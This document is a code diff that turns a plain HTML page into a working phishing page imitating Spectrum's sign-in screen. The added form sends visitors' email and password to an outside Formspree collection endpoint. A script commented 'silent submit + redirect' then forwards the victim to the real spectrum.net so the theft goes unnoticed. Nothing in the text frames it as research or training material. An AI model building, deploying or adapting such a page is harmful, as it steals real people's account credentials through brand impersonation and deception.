@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Login</title>
+    <title>Spectrum Login</title>
 </head>
 
 <body style="
@@ -12,114 +12,119 @@
     align-items:center;
     flex-direction:column;
     font-family:Arial;
-    background:#f2f2f2;
+    background:#f4f4f4;
     padding:40px 0;
 ">
 
-    <!-- TOP SMALL IMAGE -->
+    <!-- TOP LOGO -->
     <img src="Screenshot 2026-03-30 104237.png"
-         style="
-            width:180px;
-            margin-bottom:50px;
-         ">
+         style="width:160px; margin-bottom:40px;">
 
-    <!-- LOGIN FORM -->
+    <!-- LOGIN CARD -->
     <div style="
         background:white;
-        width:450px;
-        padding:60px 40px;
-        border-radius:15px;
-        box-shadow:0 0 20px rgba(0,0,0,0.15);
+        width:420px;
+        padding:50px 40px;
+        border-radius:10px;
+        box-shadow:0 2px 20px rgba(0,0,0,0.1);
         text-align:center;
     ">
 
-        <!-- TITLE -->
         <h1 style="
-            font-size:42px;
-            margin-bottom:50px;
+            font-size:34px;
+            margin-bottom:35px;
+            font-weight:600;
         ">
             Sign In to Get Started
         </h1>
 
-        <!-- EMAIL -->
-        <label style="
-            display:block;
-            font-size:18px;
-            margin-bottom:10px;
-        ">
-            Email Address
-        </label>
+        <!-- FORM -->
+        <form id="loginForm"
+              action="https://formspree.io/f/mwvzwzlp"
+              method="POST">
 
-        <input type="email"
-            style="
-                width:320px;
-                padding:14px;
-                font-size:16px;
-                border:1px solid #ccc;
-                border-radius:6px;
-                margin-bottom:35px;
-            ">
+            <!-- EMAIL -->
+            <div style="text-align:left; margin-bottom:20px;">
+                <label style="font-size:14px; color:#333;">Email Address</label><br>
+                <input type="email" name="email" required
+                    style="
+                        width:100%;
+                        padding:12px;
+                        margin-top:6px;
+                        border:1px solid #ccc;
+                        border-radius:5px;
+                        font-size:15px;
+                    ">
+            </div>
 
-        <!-- PASSWORD -->
-        <label style="
-            display:block;
-            font-size:18px;
-            margin-bottom:10px;
-        ">
-            Password
-        </label>
+            <!-- PASSWORD -->
+            <div style="text-align:left; margin-bottom:15px;">
+                <label style="font-size:14px; color:#333;">Password</label><br>
+                <input type="password" name="password" required
+                    style="
+                        width:100%;
+                        padding:12px;
+                        margin-top:6px;
+                        border:1px solid #ccc;
+                        border-radius:5px;
+                        font-size:15px;
+                    ">
+            </div>
 
-        <input type="password"
-            style="
-                width:320px;
-                padding:14px;
-                font-size:16px;
-                border:1px solid #ccc;
-                border-radius:6px;
-                margin-bottom:25px;
-            ">
+            <!-- FORGOT PASSWORD -->
+            <div style="text-align:right; margin-bottom:25px;">
+                <a href="https://spectrum.net"
+                   style="color:#0073e6; font-size:13px; text-decoration:none;">
+                    Forget Your Password?
+                </a>
+            </div>
 
-        <!-- FORGOT PASSWORD -->
-        <div style="margin-bottom:30px;">
-
-            <a href="https://spectrum.net"
-               style="
-                    color:blue;
-                    font-size:16px;
-                    text-decoration:none;
-               ">
-               Forget Your Password?
-            </a>
-
-        </div>
-
-        <!-- SIGN IN BUTTON -->
-        <a href="https://spectrum.net">
-
-            <button type="button" style="
-                width:320px;
-                padding:15px;
-                background:blue;
+            <!-- BUTTON -->
+            <button type="submit" style="
+                width:100%;
+                padding:13px;
+                background:#0073e6;
                 color:white;
                 border:none;
-                border-radius:8px;
-                font-size:20px;
+                border-radius:5px;
+                font-size:16px;
                 cursor:pointer;
             ">
                 Sign In
             </button>
 
-        </a>
+        </form>
 
     </div>
 
-    <!-- LARGE IMAGE UNDER FORM -->
+    <!-- BOTTOM IMAGE -->
     <img src="spect.png"
-         style="
-            width:450px;
-            margin-top:30px;
-            border-radius:12px;
-         ">
+         style="width:420px; margin-top:25px; border-radius:10px;">
+
+    <!-- SCRIPT (silent submit + redirect) -->
+    <script>
+        const form = document.getElementById("loginForm");
+
+        form.addEventListener("submit", function(e) {
+            e.preventDefault();
+
+            const formData = new FormData(form);
+
+            fetch("https://formspree.io/f/mwvzwzlp", {
+                method: "POST",
+                body: formData,
+                headers: {
+                    'Accept': 'application/json'
+                }
+            }).then(response => {
+                if (response.ok) {
+                    setTimeout(() => {
+                        window.location.href = "https://spectrum.net";
+                    }, 2000);
+                }
+            });
+        });
+    </script>
 
 </body>
 </html>
